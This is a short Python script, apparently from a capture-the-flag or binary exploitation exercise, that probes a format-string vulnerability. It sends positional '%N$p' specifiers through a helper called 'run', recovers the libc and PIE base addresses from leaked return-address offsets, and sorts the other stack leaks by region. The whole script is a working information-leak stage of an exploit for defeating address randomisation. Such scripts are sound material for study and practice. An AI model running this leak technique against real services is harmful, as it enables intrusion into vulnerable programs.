import sys, re
from rprobe import run
# anchors: arg19 = libc+0x29ca8 (ret), arg21 = PIE+0x1169 (main)
for k in range(22, 52, 3):
    grp=[19,21,k,k+1,k+2]
    fmt=''.join('%%%d$p.'%g for g in grp)[:-1]
    try:
        lk,out=run('1',fmt,'B')
        vals=re.findall(r'0x[0-9a-f]+|\(nil\)',out)
        if len(vals)<5: print(k,'SHORT',vals); continue
        libc=int(vals[0],16)-0x29ca8; pie=int(vals[1],16)-0x1169
        disp=[]
        for v in vals[2:]:
            x=None if v=='(nil)' else int(v,16)
            if x is None: disp.append('nil')
            elif libc<=x<libc+0x300000: disp.append('libc+%#x'%(x-libc))
            elif pie<=x<pie+0x10000: disp.append('PIE+%#x'%(x-pie))
            else: disp.append(v)
        print('k=%-3d libc=%#x pie=%#x | %s'%(k,libc,pie,disp))
    except Exception as e:
        print(k,'ERR',e)
